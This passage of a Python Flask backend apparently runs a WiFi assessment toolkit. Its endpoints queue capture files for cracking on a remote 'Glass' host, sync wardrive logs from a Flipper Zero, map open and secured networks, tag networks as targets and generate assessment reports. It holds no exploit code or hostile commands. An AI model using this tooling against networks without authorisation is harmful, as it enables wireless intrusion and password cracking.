        response = try_glass_request('post', '/resume', json=data)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/glass/queue/move', methods=['POST'])
def glass_queue_move():
    """Move file up or down in Glass queue"""
    try:
        data = request.json or {}
        response = try_glass_request('post', '/queue/move', json=data)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/glass/queue/remove', methods=['POST'])
def glass_queue_remove():
    """Remove file from Glass queue"""
    try:
        data = request.json or {}
        response = try_glass_request('post', '/queue/remove', json=data)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/glass/select', methods=['POST'])
def glass_select_file():
    """Select a file for cracking on Glass (moves to processing, doesn't start)"""
    try:
        data = request.json or {}
        response = try_glass_request('post', '/select', json=data)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/glass/start', methods=['POST'])
def glass_start_file():
    """Start cracking a specific file on Glass"""
    try:
        data = request.json or {}
        response = try_glass_request('post', '/start', json=data)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ========== WARDRIVING ENDPOINTS ==========

_flipper_cache = {'result': None, 'time': 0}

def _detect_flipper():
    """Detect Flipper Zero on serial ports. Returns {connected, port, device} or cached result."""
    import time as _t
    now = _t.time()
    if _flipper_cache['result'] and now - _flipper_cache['time'] < 5:
        return _flipper_cache['result']

    import glob, serial
    result = {'connected': False, 'port': None, 'device': 'unknown'}

    for port in sorted(glob.glob('/dev/ttyACM*')):
        try:
            ser = serial.Serial(port, 115200, timeout=2)
            _t.sleep(0.5)
            ser.reset_input_buffer()
            ser.reset_output_buffer()

            # Check for NMEA (GPS) data first
            initial = ser.read(ser.in_waiting or 1).decode('ascii', errors='ignore')
            if '$G' in initial:
                ser.close()
                continue  # GPS device, not Flipper

            # Send Flipper CLI command
            ser.write(b'storage list /ext\r\n')
            _t.sleep(1.5)

            response = b''
            while ser.in_waiting:
                response += ser.read(ser.in_waiting)
                _t.sleep(0.1)

            text = response.decode('utf-8', errors='ignore')
            ser.close()

            if 'apps_data' in text or '[D]' in text or '[F]' in text:
                result = {'connected': True, 'port': port, 'device': 'flipper'}
                break

            # Got NMEA back — GPS, skip
            if '$G' in text:
                continue

        except Exception:
            try:
                ser.close()
            except Exception:
                pass
            continue

    _flipper_cache['result'] = result
    _flipper_cache['time'] = now
    return result

@app.route('/api/flipper/status', methods=['GET'])
def flipper_status():
    """Check if Flipper is connected (real serial detection, cached 5s)"""
    return jsonify(_detect_flipper())

@app.route('/api/flipper/sync', methods=['POST'])
def flipper_sync():
    """Sync wardrive files from Flipper and update map"""
    import subprocess
    import os
    import glob
    import re
    
    sync_script = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/flipper_sync.py'
    mapper_script = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_mapper.py'
    wardrive_dir = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive'
    
    if not os.path.exists(sync_script):
        return jsonify({'success': False, 'output': 'Sync script not found'})
    
    output_log = []
    files_synced = 0
    mapper_errors = 0

    try:
        # Step 1: Run flipper sync to pull files
        output_log.append("=== Step 1: Syncing from Flipper ===")
        result = subprocess.run(
            ['python3', sync_script],
            capture_output=True,
            text=True,
            timeout=120,
            cwd='/home/ov3rr1d3/wifi_arsenal/wardrive_system'
        )
        output_log.append(result.stdout)
        if result.stderr:
            output_log.append(result.stderr)

        if result.returncode != 0:
            return jsonify({
                'success': False,
                'output': '\n'.join(output_log),
                'files_synced': 0,
                'mapper_errors': 0
            })

        # Extract synced filenames from output
        synced_files = re.findall(r'Saved to: .*/(.+\.txt)', result.stdout)
        files_synced = len(synced_files)

        # Step 2: Run mapper on each synced file
        if synced_files and os.path.exists(mapper_script):
            output_log.append("\n=== Step 2: Updating database and map ===")
            for filename in synced_files:
                filepath = os.path.join(wardrive_dir, filename)
                if os.path.exists(filepath):
                    output_log.append(f"Processing: {filename}")
                    map_result = subprocess.run(
                        ['python3', mapper_script, filename],
                        capture_output=True,
                        text=True,
                        timeout=60,
                        cwd=wardrive_dir
                    )
                    if map_result.returncode == 0:
                        output_log.append(f"✓ Mapped {filename}")
                    else:
                        mapper_errors += 1
                        output_log.append(f"✗ Failed to map {filename}: {map_result.stderr}")

        return jsonify({
            'success': True,
            'output': '\n'.join(output_log),
            'files_synced': files_synced,
            'mapper_errors': mapper_errors
        })
    except subprocess.TimeoutExpired:
        return jsonify({'success': False, 'output': 'Sync timed out', 'files_synced': 0, 'mapper_errors': 0})
    except Exception as e:
        return jsonify({'success': False, 'output': str(e), 'files_synced': 0, 'mapper_errors': 0})

@app.route('/api/wardrive/stats', methods=['GET'])
def wardrive_stats():
    """Get wardrive database statistics"""
    import sqlite3
    import os
    
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    
    if not os.path.exists(db_path):
        return jsonify({'total': 0, 'open': 0, 'secured': 0, 'sessions': 0})
    
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        # Count networks excluding vehicles and null RSSI (matches mapper filtering)
        cursor.execute('SELECT ssid, rssi, auth_mode FROM networks')
        all_nets = cursor.fetchall()
        total = 0
        open_count = 0
        for ssid, rssi, auth_mode in all_nets:
            if rssi is None:
                continue
            if is_vehicle_ssid(ssid):
                continue
            total += 1
            if auth_mode and 'OPEN' in auth_mode:
                open_count += 1

        # Secured networks
        secured = total - open_count
        
        # Sessions (check if sessions table exists)
        try:
            cursor.execute('SELECT COUNT(*) FROM sessions')
            sessions = cursor.fetchone()[0]
        except:
            sessions = 0
        
        conn.close()
        
        return jsonify({
            'total': total,
            'open': open_count,
            'secured': secured,
            'sessions': sessions
        })
    except Exception as e:
        return jsonify({'total': 0, 'open': 0, 'secured': 0, 'sessions': 0, 'error': str(e)})

@app.route('/api/wardrive/sessions', methods=['GET'])
def wardrive_sessions():
    """Get list of wardrive sessions - each file import is a session"""
    import sqlite3
    import os

    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'

    if not os.path.exists(db_path):
        return jsonify({'sessions': []})

    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Try to get sessions from sessions table first
        try:
            cursor.execute("""
                SELECT s.id, s.filename, s.imported_at, s.new_networks,
                       COUNT(DISTINCT o.mac) as net_count
                FROM sessions s
                LEFT JOIN observations o ON o.session_id = s.id
                    AND o.mac != '__GPS_TRACK__'
                    AND o.latitude IS NOT NULL
                GROUP BY s.id
                ORDER BY s.imported_at DESC
                LIMIT 50
            """)
            rows = cursor.fetchall()

            if rows:
                sessions = []
                for row in rows:
                    sessions.append({
                        'id': row[0],
                        'name': row[1],
                        'date': row[2],
                        'networks': row[4],  # from COUNT(DISTINCT mac)
                        'new_networks': row[3]
                    })
                conn.close()
                return jsonify({'sessions': sessions})
        except:
            pass  # Sessions table doesn't exist yet, fall back to old method

        # Fallback: derive sessions by grouping networks by first_seen date
        cursor.execute("""
            SELECT
                DATE(first_seen) as session_date,
                COUNT(*) as network_count
            FROM networks
            WHERE first_seen IS NOT NULL
            GROUP BY DATE(first_seen)
            ORDER BY session_date DESC
            LIMIT 20
        """)
        rows = cursor.fetchall()

        sessions = []
        for i, row in enumerate(rows):
            sessions.append({
                'id': i + 1,
                'name': f"Wardrive {row[0]}",
                'date': row[0],
                'networks': row[1]
            })

        conn.close()
        return jsonify({'sessions': sessions})
    except Exception as e:
        return jsonify({'sessions': [], 'error': str(e)})

@app.route('/api/wardrive/session/<int:session_id>', methods=['DELETE'])
def wardrive_session_delete(session_id):
    """Delete a wardrive session and its observations"""
    import sqlite3
    import os

    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'

    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Count observations to report
        cursor.execute("SELECT COUNT(*) FROM observations WHERE session_id = ?", (session_id,))
        obs_count = cursor.fetchone()[0]

        # Delete observations first (FK), then session
        cursor.execute("DELETE FROM observations WHERE session_id = ?", (session_id,))
        cursor.execute("DELETE FROM sessions WHERE id = ?", (session_id,))
        conn.commit()
        conn.close()

        return jsonify({'success': True, 'deleted_observations': obs_count})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/wardrive/session/<int:session_id>/rename', methods=['PUT'])
def wardrive_session_rename(session_id):
    """Rename a wardrive session"""
    import sqlite3

    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    data = request.json or {}
    new_name = data.get('name', '').strip()

    if not new_name:
        return jsonify({'success': False, 'error': 'Name is required'})

    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("UPDATE sessions SET filename = ? WHERE id = ?", (new_name, session_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/wardrive/filter', methods=['POST'])
def wardrive_filter():
    """Generate filtered map for a specific session (by session_id or date)"""
    import sqlite3
    import os
    import folium
    from folium import plugins

    data = request.json or {}
    session_id = data.get('session_id')
    session_date = data.get('date')

    if not session_id and not session_date:
        return jsonify({'success': False, 'error': 'No session_id or date provided'})

    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    output_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive_filtered.html'

    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        session_name = ""

        if session_id:
            # Get networks from observations for this session (GROUP BY mac to avoid duplication)
            cursor.execute("""
                SELECT n.ssid, n.mac, n.auth_mode, n.channel,
                       MAX(o.rssi) as rssi,
                       AVG(o.latitude) as latitude,
                       AVG(o.longitude) as longitude
                FROM observations o
                JOIN networks n ON o.mac = n.mac
                WHERE o.session_id = ?
                AND o.latitude IS NOT NULL AND o.longitude IS NOT NULL
                AND o.mac != '__GPS_TRACK__'
                GROUP BY n.mac
            """, (session_id,))
            networks = cursor.fetchall()

            # Get session name
            cursor.execute("SELECT filename, imported_at FROM sessions WHERE id = ?", (session_id,))
            sess_info = cursor.fetchone()
            if sess_info:
                session_name = f"{sess_info[0]} ({sess_info[1]})"
        else:
            # Fallback: Get networks for this session date
            cursor.execute("""
                SELECT ssid, mac, auth_mode, channel, rssi, latitude, longitude
                FROM networks
                WHERE DATE(first_seen) = ?
                AND latitude IS NOT NULL AND longitude IS NOT NULL
            """, (session_date,))
            networks = cursor.fetchall()
            session_name = session_date

        conn.close()
        
        if not networks:
            return jsonify({'success': False, 'error': 'No networks found for this date'})
        
        lats = [n[5] for n in networks if n[5]]
        lons = [n[6] for n in networks if n[6]]
        
        if not lats or not lons:
            return jsonify({'success': False, 'error': 'No GPS data for this session'})
        
        center_lat = sum(lats) / len(lats)
        center_lon = sum(lons) / len(lons)
        
        m = folium.Map(location=[center_lat, center_lon], zoom_start=14, tiles=None)
        
        # Add tile layers
        folium.TileLayer(
            tiles='https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}',
            attr='Google', name='Google Satellite', overlay=False, control=True
        ).add_to(m)
        
        folium.TileLayer(
            tiles='https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}',
            attr='Google', name='Google Streets', overlay=False, control=True
        ).add_to(m)
        
        # Add heat map layer (exclude vehicle networks)
        heat_data = [[n[5], n[6]] for n in networks if n[5] and n[6] and not is_vehicle_ssid(n[0])]
        plugins.HeatMap(
            heat_data,
            name='WiFi Density',
            min_opacity=0.3,
            radius=15,
            blur=10
        ).add_to(m)
        
        # Create marker clusters for open and secured networks
        open_cluster = plugins.MarkerCluster(
            name='Open Networks',
            overlay=True,
            control=True,
            show=True
        )
        
        secured_cluster = plugins.MarkerCluster(
            name='Secured Networks',
            overlay=True,
            control=True,
            show=True
        )
        
        # Add markers to clusters
        vehicle_count = 0
        for net in networks:
            ssid, mac, auth, ch, rssi, lat, lon = net
            if not lat or not lon:
                continue

            # Skip vehicle networks (match main map behavior)
            if is_vehicle_ssid(ssid):
                vehicle_count += 1
                continue

            # Color by signal strength
            if rssi and rssi > -50:
                color = 'green'
            elif rssi and rssi > -70:
                color = 'orange'
            else:
                color = 'red'
            
            is_open = auth and 'OPEN' in auth.upper()
            icon = 'unlock' if is_open else 'wifi'
            
            popup = f"<b>{ssid or 'Hidden'}</b><br>MAC: {mac}<br>Auth: {auth}<br>Ch: {ch}<br>Signal: {rssi} dBm"
            
            marker = folium.Marker(
                [lat, lon],
                popup=popup,
                icon=folium.Icon(color=color, icon=icon, prefix='fa')
            )
            
            if is_open:
                marker.add_to(open_cluster)
            else:
                marker.add_to(secured_cluster)
        
        open_cluster.add_to(m)
        secured_cluster.add_to(m)
        
        # Fit bounds
        sw = [min(lats), min(lons)]
        ne = [max(lats), max(lons)]
        m.fit_bounds([sw, ne])
        
        # Add layer control
        folium.LayerControl().add_to(m)
        
        # Add title
        display_count = len(networks) - vehicle_count
        title_html = f"""
        <div style="position: fixed; top: 10px; left: 50%; transform: translateX(-50%);
                    background: white; padding: 10px 20px; border-radius: 5px;
                    border: 2px solid #333; z-index: 9999; font-size: 16px;">
            <b>Session:</b> {session_name} ({display_count} networks)
        </div>
        """
        m.get_root().html.add_child(folium.Element(title_html))

        m.save(output_path)

        return jsonify({'success': True, 'map': '/wardrive_system/wardrive_filtered.html', 'count': display_count})
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ========== GEOFENCE ENDPOINTS ==========

@app.route('/api/wardrive/geofences', methods=['GET'])
def get_geofences():
    """Get all saved geofences"""
    import sqlite3
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'

    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        cursor.execute("""
            SELECT id, name, description, polygon_json, color, created_at, enabled
            FROM geofences
            ORDER BY created_at DESC
        """)
        rows = cursor.fetchall()
        conn.close()

        geofences = []
        for row in rows:
            geofences.append({
                'id': row[0],
                'name': row[1],
                'description': row[2],
                'polygon_json': row[3],
                'color': row[4],
                'created_at': row[5],
                'enabled': bool(row[6])
            })

        return jsonify({'success': True, 'geofences': geofences})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e), 'geofences': []})

@app.route('/api/wardrive/geofence', methods=['POST'])
def create_geofence():
    """Create a new geofence boundary"""
    import sqlite3
    import json
    from datetime import datetime

    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    data = request.json or {}

    name = data.get('name', 'Unnamed Boundary')
    description = data.get('description', '')
    polygon_json = data.get('polygon_json')
    color = data.get('color', '#00FF00')

    if not polygon_json:
        return jsonify({'success': False, 'error': 'No polygon data provided'})

    # Validate polygon JSON
    try:
        polygon_data = json.loads(polygon_json) if isinstance(polygon_json, str) else polygon_json
        if 'coordinates' not in polygon_data or not polygon_data['coordinates']:
            return jsonify({'success': False, 'error': 'Invalid polygon: no coordinates'})
    except json.JSONDecodeError as e:
        return jsonify({'success': False, 'error': f'Invalid JSON: {str(e)}'})

    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        polygon_str = json.dumps(polygon_data) if not isinstance(polygon_json, str) else polygon_json

        cursor.execute("""
            INSERT INTO geofences (name, description, polygon_json, color, created_at, enabled)
            VALUES (?, ?, ?, ?, ?, 1)
        """, (name, description, polygon_str, color, created_at))

        geofence_id = cursor.lastrowid
        conn.commit()
        conn.close()

        return jsonify({'success': True, 'id': geofence_id, 'created_at': created_at})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/wardrive/geofence/<int:geofence_id>', methods=['DELETE'])
def delete_geofence(geofence_id):
    """Delete a geofence by ID"""
    import sqlite3
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'

    conn = None
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        cursor.execute("DELETE FROM geofences WHERE id = ?", (geofence_id,))
        deleted = cursor.rowcount
        conn.commit()

        if deleted:
            return jsonify({'success': True, 'message': f'Geofence {geofence_id} deleted'})
        else:
            return jsonify({'success': False, 'error': 'Geofence not found'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        if conn:
            conn.close()

@app.route('/api/wardrive/geofence/<int:geofence_id>/toggle', methods=['POST'])
def toggle_geofence(geofence_id):
    """Toggle geofence enabled/disabled"""
    import sqlite3
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'

    conn = None
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        cursor.execute("UPDATE geofences SET enabled = NOT enabled WHERE id = ?", (geofence_id,))
        updated = cursor.rowcount

        if updated:
            cursor.execute("SELECT enabled FROM geofences WHERE id = ?", (geofence_id,))
            new_state = bool(cursor.fetchone()[0])
            conn.commit()
            return jsonify({'success': True, 'enabled': new_state})
        else:
            return jsonify({'success': False, 'error': 'Geofence not found'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        if conn:
            conn.close()

@app.route('/api/wardrive/geofence/<int:geofence_id>/networks', methods=['GET'])
def get_networks_in_geofence(geofence_id):
    """Get all networks inside a specific geofence"""
    import sqlite3
    import json

    try:
        from shapely.geometry import Point, shape
    except ImportError:
        return jsonify({
            'success': False,
            'error': 'Shapely library not installed. Run: sudo apt install python3-shapely'
        })

    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'

    conn = None
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Get the geofence polygon
        cursor.execute("SELECT polygon_json FROM geofences WHERE id = ?", (geofence_id,))
        row = cursor.fetchone()
        if not row:
            return jsonify({'success': False, 'error': 'Geofence not found'})

        try:
            polygon_data = json.loads(row[0])
            polygon = shape(polygon_data)
        except (ValueError, KeyError) as e:
            return jsonify({'success': False, 'error': f'Invalid geofence geometry: {str(e)}'})

        # Get all networks with coordinates
        cursor.execute("""
            SELECT mac, ssid, auth_mode, latitude, longitude, rssi, channel
            FROM networks
            WHERE latitude IS NOT NULL AND longitude IS NOT NULL
        """)
        networks = cursor.fetchall()

        # Filter networks inside polygon
        inside_networks = []
        for net in networks:
            mac, ssid, auth_mode, lat, lon, rssi, channel = net
            point = Point(lon, lat)  # Note: GeoJSON uses lon, lat order
            if polygon.contains(point):
                inside_networks.append({
                    'mac': mac,
                    'ssid': ssid,
                    'auth_mode': auth_mode,
                    'latitude': lat,
                    'longitude': lon,
                    'rssi': rssi,
                    'channel': channel
                })

        return jsonify({
            'success': True,
            'geofence_id': geofence_id,
            'count': len(inside_networks),
            'networks': inside_networks
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        if conn:
            conn.close()

@app.route('/api/glass/gpu_stats', methods=['GET'])
def glass_gpu_stats():
    """Proxy GPU stats from Glass"""
    try:
        response = try_glass_request('get', '/gpu_stats')
        if response.status_code == 200:
            return jsonify(response.json())
        else:
            return jsonify({'gpu_percent': 0, 'temp_c': 0, 'vram_used_gb': 0, 'vram_total_gb': 0, 'error': 'Glass returned ' + str(response.status_code)})
    except Exception as e:
        return jsonify({'gpu_percent': 0, 'temp_c': 0, 'vram_used_gb': 0, 'vram_total_gb': 0, 'error': str(e)})

# ========== WARDRIVE REPORT ENDPOINTS ==========

@app.route('/api/wardrive/report/generate', methods=['POST'])
def generate_wardrive_report():
    """Generate a PDF report of wardrive findings"""
    try:
        from wardrive_system import report_generator
    except ImportError as e:
        return jsonify({'success': False, 'error': f'Report generator not available: {str(e)}'})

    data = request.json or {}
    report_type = data.get('report_type', 'summary')  # executive, summary, full
    client_name = data.get('client_name', 'Security Assessment')
    geofence_id = data.get('geofence_id')  # Optional
    vuln_threshold = data.get('vuln_threshold', 'all')  # all, high, critical
    include_map = data.get('include_map', True)

    # Validate report_type
    if report_type not in ['executive', 'summary', 'full']:
        return jsonify({'success': False, 'error': 'Invalid report_type. Use: executive, summary, full'})

    # Validate vuln_threshold
    if vuln_threshold not in ['all', 'high', 'critical']:
        return jsonify({'success': False, 'error': 'Invalid vuln_threshold. Use: all, high, critical'})

    try:
        pdf_bytes = report_generator.generate_report(
            report_type=report_type,
            client_name=client_name,
            geofence_id=geofence_id,
            vuln_threshold=vuln_threshold,
            include_map=include_map
        )

        # Return PDF as downloadable file
        from flask import send_file
        import io
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f"wardrive_report_{report_type}_{timestamp}.pdf"

        return send_file(
            io.BytesIO(pdf_bytes),
            mimetype='application/pdf',
            as_attachment=True,
            download_name=filename
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/wardrive/report/preview', methods=['POST'])
def preview_wardrive_report():
    """Generate HTML preview of report (no PDF)"""
    try:
        from wardrive_system import report_generator
    except ImportError as e:
        return jsonify({'success': False, 'error': f'Report generator not available: {str(e)}'})

    data = request.json or {}
    report_type = data.get('report_type', 'summary')
    client_name = data.get('client_name', 'Security Assessment')
    geofence_id = data.get('geofence_id')
    vuln_threshold = data.get('vuln_threshold', 'all')
    include_map = data.get('include_map', True)

    try:
        html_content = report_generator.generate_preview(
            report_type=report_type,
            client_name=client_name,
            geofence_id=geofence_id,
            vuln_threshold=vuln_threshold,
            include_map=include_map
        )
        return jsonify({'success': True, 'html': html_content})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/wardrive/report/stats', methods=['GET'])
def get_report_stats():
    """Get statistics for report generation (network counts by risk level)"""
    try:
        from wardrive_system import report_generator
    except ImportError as e:
        return jsonify({'success': False, 'error': f'Report generator not available: {str(e)}'})

    geofence_id = request.args.get('geofence_id', type=int)

    try:
        networks = report_generator.get_networks_for_report(
            geofence_id=geofence_id,
            vuln_threshold='all'
        )

        # Count by risk level
        risk_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        for net in networks:
            risk = report_generator.categorize_risk(net)
            risk_counts[risk] = risk_counts.get(risk, 0) + 1

        return jsonify({
            'success': True,
            'total_networks': len(networks),
            'risk_counts': risk_counts,
            'geofence_id': geofence_id
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ========== TARGET TAGGING ENDPOINTS ==========

VALID_TAG_CATEGORIES = ['primary', 'secondary', 'out_of_scope', 'custom']

@app.route('/api/wardrive/tag/<path:mac>', methods=['PUT'])
def set_target_tag(mac):
    """Set or update a target tag for a network"""
    import html

    data = request.json or {}
    tag_category = data.get('tag_category', '').lower().strip()
    tag_notes = data.get('notes', '').strip()

    # Validate tag category
    if tag_category not in VALID_TAG_CATEGORIES:
        return jsonify({
            'success': False,
            'error': f'Invalid tag category. Must be one of: {", ".join(VALID_TAG_CATEGORIES)}'
        }), 400

    # Sanitize notes (prevent XSS)
    if tag_notes:
        tag_notes = html.escape(tag_notes)[:500]  # Max 500 chars

    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    try:
        import sqlite3
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Verify network exists
        cursor.execute('SELECT mac, ssid FROM networks WHERE mac = ?', (mac,))
        row = cursor.fetchone()
        if not row:
            conn.close()
            return jsonify({'success': False, 'error': 'Network not found'}), 404

        # Update the tag
        cursor.execute('''
            UPDATE networks
            SET target_tag = ?, target_notes = ?
            WHERE mac = ?
        ''', (tag_category, tag_notes or None, mac))
        conn.commit()
        conn.close()

        return jsonify({
            'success': True,
            'mac': mac,
            'ssid': row[1],
            'tag_category': tag_category,
            'notes': tag_notes
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/wardrive/tag/<path:mac>', methods=['DELETE'])
def remove_target_tag(mac):
    """Remove a target tag from a network"""
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    try:
        import sqlite3
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Verify network exists
        cursor.execute('SELECT mac FROM networks WHERE mac = ?', (mac,))
        if not cursor.fetchone():
            conn.close()
            return jsonify({'success': False, 'error': 'Network not found'}), 404

        # Remove the tag
        cursor.execute('''
            UPDATE networks
            SET target_tag = NULL, target_notes = NULL
            WHERE mac = ?
        ''', (mac,))
        conn.commit()
        conn.close()

        return jsonify({'success': True, 'mac': mac, 'message': 'Tag removed'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/wardrive/tags', methods=['GET'])
def get_target_tags():
    """Get all tagged networks"""
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    try:
        import sqlite3
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        cursor.execute('''
            SELECT mac, ssid, auth_mode, channel, rssi, target_tag, target_notes,
                   latitude, longitude
            FROM networks
            WHERE target_tag IS NOT NULL
            ORDER BY
                CASE target_tag
                    WHEN 'primary' THEN 1
                    WHEN 'secondary' THEN 2
                    WHEN 'out_of_scope' THEN 3
                    ELSE 4
                END,
                ssid
        ''')

        tagged = []
        for row in cursor.fetchall():
            tagged.append({
                'mac': row['mac'],
                'ssid': row['ssid'] or '(Hidden)',
                'auth_mode': row['auth_mode'],
                'channel': row['channel'],
                'rssi': row['rssi'],
                'tag_category': row['target_tag'],
                'notes': row['target_notes'],
                'lat': row['latitude'],
                'lon': row['longitude']
            })

        conn.close()

        # Count by category
        counts = {'primary': 0, 'secondary': 0, 'out_of_scope': 0, 'custom': 0}
        for net in tagged:
            cat = net['tag_category']
            if cat in counts:
                counts[cat] += 1

        return jsonify({
            'success': True,
            'tagged_networks': tagged,
            'counts': counts,
            'total': len(tagged)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ========== CUSTOM MAP MARKERS ==========

@app.route('/api/wardrive/markers', methods=['GET'])
def get_custom_markers():
    """Fetch all custom map markers"""
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    try:
        import sqlite3
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT id, latitude, longitude, label, color, created_at FROM custom_markers ORDER BY created_at DESC')
        markers = [{'id': r[0], 'lat': r[1], 'lon': r[2], 'label': r[3], 'color': r[4], 'created_at': r[5]} for r in cursor.fetchall()]
        conn.close()
        return jsonify({'success': True, 'markers': markers})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/wardrive/marker', methods=['POST'])
def create_custom_marker():
    """Create a new custom map marker"""
    import html as html_mod
    data = request.json or {}
    lat = data.get('lat')
    lon = data.get('lon')
    label = data.get('label', '').strip()
    color = data.get('color', '#ff0000').strip()

    if lat is None or lon is None:
        return jsonify({'success': False, 'error': 'lat and lon required'}), 400
    if not label:
        return jsonify({'success': False, 'error': 'label required'}), 400

    label = html_mod.escape(label)[:100]
    # Validate hex color
    if not (len(color) == 7 and color[0] == '#' and all(c in '0123456789abcdefABCDEF' for c in color[1:])):
        color = '#ff0000'

    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    try:
        import sqlite3
        from datetime import datetime
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute('INSERT INTO custom_markers (latitude, longitude, label, color, created_at) VALUES (?, ?, ?, ?, ?)',
                       (float(lat), float(lon), label, color, now))
        marker_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'id': marker_id, 'lat': float(lat), 'lon': float(lon), 'label': label, 'color': color})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/wardrive/marker/<int:marker_id>', methods=['DELETE'])
def delete_custom_marker(marker_id):
    """Delete a custom map marker"""
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    try:
        import sqlite3
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM custom_markers WHERE id = ?', (marker_id,))
        if cursor.rowcount == 0:
            conn.close()
            return jsonify({'success': False, 'error': 'Marker not found'}), 404
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'message': 'Marker deleted'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ========== LIVE WARDRIVE ENDPOINTS ==========

@app.route('/api/wardrive/live/start', methods=['POST'])
def wardrive_live_start():
    """Start a live wardrive scanning session"""
    global wardrive_live_state

    if wardrive_live_state['running']:
        return jsonify({'success': False, 'error': 'Live scan already running'})

    try:
        # Stop the server's GPS reader so it doesn't conflict with the scanner's
        _stop_gps_reader()
        import time as _time
        _time.sleep(0.5)  # Let serial port release

        data = request.json or {}
        session_name = data.get('session_name', '').strip() or None

        from live_scanner import LiveWardriveSession
        session = LiveWardriveSession(session_name=session_name)
        session.start()
        wardrive_live_state['session'] = session
        wardrive_live_state['running'] = True
        return jsonify({
            'success': True,
            'session_id': session.session_id,
            'message': 'Live wardrive started'
        })
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/wardrive/live/stop', methods=['POST'])
def wardrive_live_stop():
    """Stop live wardrive and finalize session"""
    global wardrive_live_state

    if not wardrive_live_state['running']:
        return jsonify({'success': False, 'error': 'No live scan running'})

    try:
        session = wardrive_live_state['session']
        session.stop()
        result = {
            'success': True,
            'session_id': session.session_id,
            'networks_found': session.networks_found,
            'new_networks': session.new_networks,
